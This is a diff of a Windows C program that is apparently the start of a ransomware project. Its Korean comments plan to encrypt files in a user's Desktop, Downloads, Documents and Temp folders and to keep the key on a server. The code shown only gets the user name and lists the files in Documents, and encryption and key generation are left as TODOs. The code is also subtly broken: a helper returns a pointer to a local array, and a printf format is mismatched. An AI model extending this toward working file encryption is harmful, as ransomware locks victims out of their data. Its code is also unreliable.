@@ -1,55 +1,129 @@
 #include <stdio.h>
 #include <Windows.h>
 #include <winbase.h>
+#include <strsafe.h>
+#pragma comment(lib, "User32.lib")
 
 #define BUFFER_SIZE 512
+char *getUserName();
+void DisplayErrorBox(LPTSTR lpszFunction);
 
 // 공격한다는 의미가 무엇인지??
 // 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.
-// 서버용 , 클라이언트 
-// 타깃을 구조체로 묶어 재분류 하라는 것이 
+// 서버용 , 클라이언트
+// 타깃을 구조체로 묶어 재분류 하라는 것이
 // Desktop, Downloads, Documents ...Temp를 한 구조체 안에서 다루도록
 
-int main() {
+int main()
+{
 
-    // 이름 불러오기
-    char acUserName[100];
-    DWORD nUserName = sizeof(acUserName);
-    GetUserName(acUserName, &nUserName);
-    printf("%s \n", acUserName);
+    char *userName = getUserName();
     // TODO : 키생성
 
-    // Temp 파일에 접근
-    char buf[BUFFER_SIZE] = {0,};
-    DWORD readn;
-    DWORD writen;
+    WIN32_FIND_DATA ffd;
+    LARGE_INTEGER filesize;
+    TCHAR szDir[MAX_PATH];
+    size_t length_of_arg;
+    HANDLE hFind = INVALID_HANDLE_VALUE;
+    DWORD dwError = 0;
 
-    char srcName[100];
-    char desName[100];
-    sprintf(srcName, "C:\\Users\\%s%s", acUserName,"\\source.txt");
-    sprintf(desName, "C:\\Users\\%s%s", acUserName,"\\AppData\\Local\\Temp\\destination.txt");
+    char dirName[100] = {0, };
+    sprintf(dirName, "%s%s%s", "C:\\Users\\", userName, "\\Documents" );
 
-    // 읽기 파일
-    HANDLE file1 = CreateFile(srcName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if(file1 == INVALID_HANDLE_VALUE) {
-        printf("file1 open error\n");
-        return 0;
+    // Check that the input path plus 3 is not longer than MAX_PATH.
+    // Three characters are for the "\*" plus NULL appended below.
+
+    StringCchLength(dirName, MAX_PATH, &length_of_arg);
+    if (length_of_arg > (MAX_PATH - 3)) {
+        printf(TEXT("\nDirectory path is too long.\n"));
+        return (-1);
     }
 
-    // 쓰기 파일
-    HANDLE file2 = CreateFile(desName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
-    if(file2 == INVALID_HANDLE_VALUE) {
-        printf("file2 open error\n");
-        return 0;
+    printf(TEXT("\nTarget directory is %s\n\n"), dirName);
+
+    // Prepare string for use with FindFile functions.  First, copy the
+    // string to a buffer, then append '\*' to the directory name.
+
+    StringCchCopy(szDir, MAX_PATH, dirName);
+    StringCchCat(szDir, MAX_PATH, TEXT("\\*"));
+
+    // Find the first file in the directory.
+
+    hFind = FindFirstFile(szDir, &ffd);
+
+    if (INVALID_HANDLE_VALUE == hFind) {
+        DisplayErrorBox(TEXT("FindFirstFile"));
+        return dwError;
     }
-    while (ReadFile(file1, buf, BUFFER_SIZE-1, &readn, NULL)) {
-        if(readn == 0){
-            break;
+
+    // List all the files in the directory with some info about them.
+    do{
+        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            printf(TEXT("  %s   <DIR>\n"), ffd.cFileName);
         }
-        // TODO : 암호화 필요
-        WriteFile(file2, buf, readn, &writen, NULL);
+        else {
+            filesize.LowPart = ffd.nFileSizeLow;
+            filesize.HighPart = ffd.nFileSizeHigh;
+            printf(TEXT("  %s   %ld bytes\n"), ffd.cFileName, filesize.QuadPart);
+        }
+    } while (FindNextFile(hFind, &ffd) != 0);
+
+    dwError = GetLastError();
+    if (dwError != ERROR_NO_MORE_FILES) {
+        DisplayErrorBox(TEXT("FindFirstFile"));
     }
-
-
+    FindClose(hFind);
 }
 
+
+
+
+
+
+/**
+ * get user name
+*/
+char *getUserName()
+{
+    char acUserName[100] = {
+        0,
+    };
+    DWORD nUserName = sizeof(acUserName);
+    GetUserName(acUserName, &nUserName);
+    return acUserName;
+}
+
+/**
+ * error box
+*/
+void DisplayErrorBox(LPTSTR lpszFunction) 
+{ 
+    // Retrieve the system error message for the last-error code
+
+    LPVOID lpMsgBuf;
+    LPVOID lpDisplayBuf;
+    DWORD dw = GetLastError(); 
+
+    FormatMessage(
+        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
+        FORMAT_MESSAGE_FROM_SYSTEM |
+        FORMAT_MESSAGE_IGNORE_INSERTS,
+        NULL,
+        dw,
+        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
+        (LPTSTR) &lpMsgBuf,
+        0, NULL );
+
+    // Display the error message and clean up
+
+    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
+        (lstrlen((LPCTSTR)lpMsgBuf)+lstrlen((LPCTSTR)lpszFunction)+40)*sizeof(TCHAR)); 
+    StringCchPrintf((LPTSTR)lpDisplayBuf, 
+        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
+        TEXT("%s failed with error %d: %s"), 
+        lpszFunction, dw, lpMsgBuf); 
+    MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK); 
+
+    LocalFree(lpMsgBuf);
+    LocalFree(lpDisplayBuf);
+}
